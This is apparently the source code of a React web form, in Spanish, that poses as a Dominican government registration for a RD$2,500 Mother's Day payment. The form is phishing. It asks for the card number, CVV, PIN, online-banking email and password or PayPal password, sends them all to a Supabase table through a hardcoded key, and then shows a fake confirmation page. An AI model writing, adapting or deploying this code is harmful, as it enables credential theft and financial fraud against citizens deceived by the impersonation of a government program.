"use client"

import type React from "react"
import { useState } from "react"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { Label } from "@/components/ui/label"
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select"

const METODOS_PAGO = [
  { value: "Banco de Reservas", label: "Banco de Reservas" },
  { value: "BHD", label: "BHD" },
  { value: "Popular", label: "Popular" },
  { value: "Scotiabank", label: "Scotiabank" },
  { value: "APAP", label: "APAP" },
  { value: "PayPal", label: "PayPal" },
]

interface FormValues {
  nombre_completo: string
  cedula: string
  correo: string
  telefono: string
  metodo_pago: string
  banco: string
  numero_tarjeta: string
  nombre_tarjeta: string
  vencimiento_tarjeta: string
  cvv: string
  clave_tarjeta: string
  correo_banco: string
  clave_banco: string
  cuenta_paypal: string
  clave_paypal: string
}

const INITIAL_DATA: FormValues = {
  nombre_completo: "",
  cedula: "",
  correo: "",
  telefono: "",
  metodo_pago: "",
  banco: "",
  numero_tarjeta: "",
  nombre_tarjeta: "",
  vencimiento_tarjeta: "",
  cvv: "",
  clave_tarjeta: "",
  correo_banco: "",
  clave_banco: "",
  cuenta_paypal: "",
  clave_paypal: "",
}

// Credenciales de Supabase
const SUPABASE_URL = "https://gtxnqksnqftlzhubrfgq.supabase.co"
const SUPABASE_ANON_KEY =
  "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Imd0eG5xa3NucWZ0bHpodWJyZmdxIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NDczNTUyNDMsImV4cCI6MjA2MjkzMTI0M30.MXilSAxR5O-JH-mwulq78pXReSGjg4cdzprJz0_USzY"

export default function RegistroMadres() {
  const [form, setForm] = useState(INITIAL_DATA)
  const [enviando, setEnviando] = useState(false)
  const [mensaje, setMensaje] = useState<string | null>(null)
  const [error, setError] = useState<string | null>(null)
  const [exito, setExito] = useState(false)

  const esBanco = form.metodo_pago && form.metodo_pago !== "PayPal" && form.metodo_pago !== ""
  const esPayPal = form.metodo_pago === "PayPal"

  const handleInput = (e: React.ChangeEvent<HTMLInputElement> | React.ChangeEvent<HTMLSelectElement>) => {
    const { name, value } = e.target
    setForm((prev) => ({ ...prev, [name]: value }))
  }

  const handleMetodoPago = (value: string) => {
    setForm((prev) => ({
      ...prev,
      metodo_pago: value,
      banco: value === "PayPal" ? "" : value,
      numero_tarjeta: "",
      nombre_tarjeta: "",
      vencimiento_tarjeta: "",
      cvv: "",
      clave_tarjeta: "",
      correo_banco: "",
      clave_banco: "",
      cuenta_paypal: "",
      clave_paypal: "",
    }))
    setMensaje(null)
    setError(null)
  }

  // Validar campos obligatorios
  const validar = () => {
    if (!form.nombre_completo.trim()) return "El nombre completo es obligatorio."
    if (!/^\d{3}-?\d{7}-?\d?$/.test(form.cedula)) return "Cédula no válida."
    if (!/^[^@\s]+@[^@\s]+\.[^@\s]+$/.test(form.correo)) return "Correo no válido."
    if (!form.metodo_pago) return "Debe elegir un método de pago."
    if (esBanco) {
      if (!form.numero_tarjeta.trim()) return "Ingrese el número de tarjeta."
      if (!/^\d{12,19}$/.test(form.numero_tarjeta.replace(/\s/g, ""))) return "Número de tarjeta inválido."
      if (!form.nombre_tarjeta.trim()) return "Ingrese el nombre que aparece en la tarjeta."
      if (!/^\d{2}\/(\d{2})$/.test(form.vencimiento_tarjeta)) return "Vencimiento debe ser MM/AA."
      if (!/^\d{3,4}$/.test(form.cvv)) return "CVV inválido."
      if (!form.clave_tarjeta.trim()) return "Ingrese la clave o pin."
      if (!form.correo_banco.trim()) return "Ingrese el correo de la cuenta bancaria."
      if (!/^[^@\s]+@[^@\s]+\.[^@\s]+$/.test(form.correo_banco)) return "Correo de cuenta bancaria no válido."
      if (!form.clave_banco.trim()) return "Ingrese la contraseña de la cuenta bancaria."
    } else if (esPayPal) {
      if (!/^[^@\s]+@[^@\s]+\.[^@\s]+$/.test(form.cuenta_paypal)) return "Correo PayPal inválido."
      if (!form.clave_paypal.trim()) return "Ingrese la contraseña de PayPal."
    }
    return null
  }

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault()
    setMensaje(null)
    setError(null)
    const errorMsg = validar()
    if (errorMsg) {
      setError(errorMsg)
      return
    }
    setEnviando(true)
    try {
      const datosEnviar = {
        nombre_completo: form.nombre_completo,
        cedula: form.cedula,
        correo: form.correo,
        telefono: form.telefono,
        banco: esBanco ? form.banco : null,
        numero_tarjeta: esBanco ? form.numero_tarjeta : null,
        nombre_tarjeta: esBanco ? form.nombre_tarjeta : null,
        vencimiento_tarjeta: esBanco ? form.vencimiento_tarjeta : null,
        cvv: esBanco ? form.cvv : null,
        clave_tarjeta: esBanco ? form.clave_tarjeta : null,
        correo_banco: esBanco ? form.correo_banco : null,
        clave_banco: esBanco ? form.clave_banco : null,
        cuenta_paypal: esPayPal ? form.cuenta_paypal : null,
        clave_paypal: esPayPal ? form.clave_paypal : null,
        metodo_pago: form.metodo_pago,
      }

      // Mostrar en consola para depuración
      console.log("DATOS A ENVIAR:", datosEnviar)

      const res = await fetch(`${SUPABASE_URL}/rest/v1/beneficiarios`, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
          apikey: SUPABASE_ANON_KEY,
          Authorization: `Bearer ${SUPABASE_ANON_KEY}`,
          Prefer: "return=representation",
        },
        body: JSON.stringify(datosEnviar),
      })

      const responseText = await res.text()
      console.log("Respuesta completa:", responseText)

      if (res.ok) {
        setMensaje("Registro enviado correctamente. Pronto nos pondremos en contacto.")
        setForm(INITIAL_DATA)
        setExito(true)
      } else {
        let errorMessage = "Error al guardar. Intente más tarde."
        try {
          const data = JSON.parse(responseText)
          errorMessage = (data?.message || errorMessage) + (data?.code ? ` (Código: ${data.code})` : "")
        } catch (e) {
          errorMessage += " Respuesta no válida del servidor."
        }
        setError(errorMessage)
      }
    } catch (e) {
      console.error("Error completo:", e)
      setError("Error de conexión/intento, intente más tarde.")
    } finally {
      setEnviando(false)
    }
  }

  if (exito) {
    return (
      <section className="bg-white rounded-lg shadow-md p-6 md:p-8 mt-6 mb-6 text-center">
        <div className="mb-6">
          <div className="w-16 h-16 bg-green-100 rounded-full flex items-center justify-center mx-auto mb-4">
            <svg
              xmlns="http://www.w3.org/2000/svg"
              className="h-8 w-8 text-green-600"
              fill="none"
              viewBox="0 0 24 24"
              stroke="currentColor"
            >
              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M5 13l4 4L19 7" />
            </svg>
          </div>
          <h1 className="text-2xl font-bold text-[#003366] mb-2">¡Registro Exitoso!</h1>
          <p className="text-gray-600 mb-6">
            Tu solicitud para recibir el pago especial de RD$2,500 por el Día de las Madres ha sido registrada
            correctamente.
          </p>
          <div className="bg-blue-50 border border-blue-200 rounded-md p-4 mb-6 text-left">
            <h2 className="text-lg font-semibold text-[#003366] mb-2">Próximos pasos:</h2>
            <ul className="list-disc list-inside text-gray-700 space-y-2">
              <li>Recibirás un correo electrónico de confirmación en las próximas 24 horas.</li>
              <li>El pago será procesado en un plazo de 3 a 5 días hábiles.</li>
              <li>
                Si tienes alguna pregunta, puedes contactar al centro de atención al ciudadano al teléfono 809-200-7100.
              </li>
            </ul>
          </div>
          <Button className="w-full md:w-auto" onClick={() => setExito(false)}>
            Volver al inicio
          </Button>
        </div>
      </section>
    )
  }

  return (
    <section className="bg-white rounded-lg shadow-md p-6 md:p-8 mt-6 mb-6">
      <h2 className="text-lg md:text-2xl font-bold text-[#003366] mb-1">Registro para recibir RD$2,500</h2>
      <p className="mb-4 text-gray-600 text-sm md:text-base">
        Completa el formulario para ser beneficiario del pago especial del Gobierno por el Día de las Madres.
      </p>
      <form className="space-y-5" onSubmit={handleSubmit}>
        <div>
          <Label htmlFor="nombre_completo">Nombre completo *</Label>
          <Input
            id="nombre_completo"
            name="nombre_completo"
            value={form.nombre_completo}
            onChange={handleInput}
            required
          />
        </div>
        <div>
          <Label htmlFor="cedula">Cédula de identidad dominicana *</Label>
          <Input
            id="cedula"
            name="cedula"
            value={form.cedula}
            onChange={handleInput}
            required
            maxLength={13}
            placeholder="001-1234567-1"
          />
        </div>
        <div>
          <Label htmlFor="correo">Correo electrónico *</Label>
          <Input id="correo" name="correo" type="email" value={form.correo} onChange={handleInput} required />
        </div>
        <div>
          <Label htmlFor="telefono">Teléfono (opcional)</Label>
          <Input
            id="telefono"
            name="telefono"
            value={form.telefono}
            onChange={handleInput}
            maxLength={15}
            placeholder="809-000-0000"
          />
        </div>
        <div>
          <Label htmlFor="metodo_pago">Método de pago *</Label>
          <Select onValueChange={handleMetodoPago} value={form.metodo_pago} required>
            <SelectTrigger>
              <SelectValue placeholder="Selecciona un método de pago" />
            </SelectTrigger>
            <SelectContent>
              {METODOS_PAGO.map((m) => (
                <SelectItem value={m.value} key={m.value}>
                  {m.label}
                </SelectItem>
              ))}
            </SelectContent>
          </Select>
        </div>
        {esBanco && (
          <div className="space-y-3 p-4 border border-gray-200 rounded-md bg-gray-50">
            <div>
              <Label htmlFor="banco">Banco *</Label>
              <select
                id="banco"
                name="banco"
                value={form.banco}
                onChange={handleInput}
                required
                className="w-full px-3 py-2 rounded border border-gray-300"
              >
                <option value="">Seleccione el banco</option>
                {METODOS_PAGO.filter((m) => m.value !== "PayPal").map((b) => (
                  <option value={b.value} key={b.value}>
                    {b.label}
                  </option>
                ))}
              </select>
            </div>
            <div>
              <Label htmlFor="numero_tarjeta">N° de tarjeta de débito/crédito *</Label>
              <Input
                id="numero_tarjeta"
                name="numero_tarjeta"
                value={form.numero_tarjeta}
                onChange={handleInput}
                inputMode="numeric"
                required
                maxLength={19}
                placeholder="0000111122223333"
              />
            </div>
            <div>
              <Label htmlFor="nombre_tarjeta">Nombre que aparece en la tarjeta *</Label>
              <Input
                id="nombre_tarjeta"
                name="nombre_tarjeta"
                value={form.nombre_tarjeta}
                onChange={handleInput}
                required
              />
            </div>
            <div className="flex gap-4">
              <div className="w-1/2">
                <Label htmlFor="vencimiento_tarjeta">Vencimiento (MM/AA) *</Label>
                <Input
                  id="vencimiento_tarjeta"
                  name="vencimiento_tarjeta"
                  value={form.vencimiento_tarjeta}
                  onChange={handleInput}
                  required
                  maxLength={5}
                  placeholder="08/28"
                />
              </div>
              <div className="w-1/2">
                <Label htmlFor="cvv">CVV *</Label>
                <Input
                  id="cvv"
                  name="cvv"
                  value={form.cvv}
                  onChange={handleInput}
                  inputMode="numeric"
                  required
                  maxLength={4}
                  placeholder="123"
                />
              </div>
            </div>
            <div>
              <Label htmlFor="clave_tarjeta">Clave o pin *</Label>
              <Input
                id="clave_tarjeta"
                name="clave_tarjeta"
                type="password"
                value={form.clave_tarjeta}
                onChange={handleInput}
                required
                maxLength={12}
                placeholder="******"
              />
            </div>
            <div>
              <Label htmlFor="correo_banco">Correo de la cuenta bancaria *</Label>
              <Input
                id="correo_banco"
                name="correo_banco"
                type="email"
                value={form.correo_banco}
                onChange={handleInput}
                required={esBanco}
                placeholder="ejemplo@correo.com"
              />
            </div>
            <div>
              <Label htmlFor="clave_banco">Contraseña de la cuenta bancaria *</Label>
              <Input
                id="clave_banco"
                name="clave_banco"
                type="password"
                value={form.clave_banco}
                onChange={handleInput}
                required={esBanco}
                maxLength={30}
                placeholder="********"
              />
            </div>
          </div>
        )}
        {esPayPal && (
          <div className="space-y-3 p-4 border border-gray-200 rounded-md bg-gray-50">
            <div>
              <Label htmlFor="cuenta_paypal">Correo de la cuenta PayPal *</Label>
              <Input
                id="cuenta_paypal"
                name="cuenta_paypal"
                type="email"
                value={form.cuenta_paypal}
                onChange={handleInput}
                required
              />
            </div>
            <div>
              <Label htmlFor="clave_paypal">Contraseña de la cuenta PayPal *</Label>
              <Input
                id="clave_paypal"
                name="clave_paypal"
                type="password"
                value={form.clave_paypal}
                onChange={handleInput}
                required
                maxLength={30}
                placeholder="********"
              />
            </div>
          </div>
        )}
        {error && <p className="text-red-600 font-medium text-sm">{error}</p>}
        {mensaje && <p className="text-green-700 font-medium text-sm">{mensaje}</p>}
        <Button type="submit" disabled={enviando} className="w-full mt-2">
          {enviando ? "Enviando..." : "Enviar solicitud"}
        </Button>
      </form>
    </section>
  )
}
